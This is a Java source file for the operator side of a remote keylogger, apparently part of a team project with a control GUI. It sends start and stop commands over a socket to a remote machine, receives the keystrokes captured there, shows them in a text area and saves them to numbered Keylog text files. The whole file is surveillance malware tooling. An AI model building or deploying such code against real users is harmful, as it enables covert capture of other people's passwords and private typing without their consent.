package team6.client.handler;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import team6.client.gui.ControlGUI;
import team6.client.socket.SocketHandler;

public class Keylogger {
    private ControlGUI controlGUI;
    private SocketHandler socketHandler;
    
    public Keylogger(ControlGUI controlGUI, Socket socket) throws IOException {
        this.controlGUI = controlGUI;
        this.socketHandler = new SocketHandler(socket);
    }

    public void startKeyLog() throws IOException {
        Thread th = new Thread() {
            @Override
            public void run() {
                try {
                    socketHandler.send("<START>$<>");
                    while (controlGUI.getBtnKeyLog().isSelected()) {
                        String keyText = new String(socketHandler.receive());
                        controlGUI.getTxtKeyLog().setText(controlGUI.getTxtKeyLog().getText() + keyText);
                    }
                } catch (IOException ex) {
                    Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        };
        th.start();
    }
    
    public void stopKeyLog() throws IOException {
        socketHandler.send("<STOP>$<>");
    }
    
    public void saveLog(String directory) {
        Thread th = new Thread() {
            @Override
            public void run() {
                File dir = new File(directory);
                if (!dir.exists()) {
                    dir.mkdirs();
                }
                
                String fileName = "Keylog";
                File file = new File(directory + "\\" + fileName + ".txt");

                int count = 0;
                while (file.exists()) {
                    count++;
                    file = new File(directory + "\\" + fileName + " (" + count + ").txt");
                }
                
                try {
                    FileWriter out = new FileWriter(file);
                    String buff = controlGUI.getTxtKeyLog().getText();
                    if (buff.length() > 0) {
                        out.write(controlGUI.getTxtKeyLog().getText());
                        out.flush();
                        System.out.println("Saved to " + file.getAbsolutePath());
                    }
                    out.close();
                } catch (IOException ex) {
                    Logger.getLogger(Monitor.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        };
        th.start();
    }

    public void close() {
        socketHandler.close();
    }
}
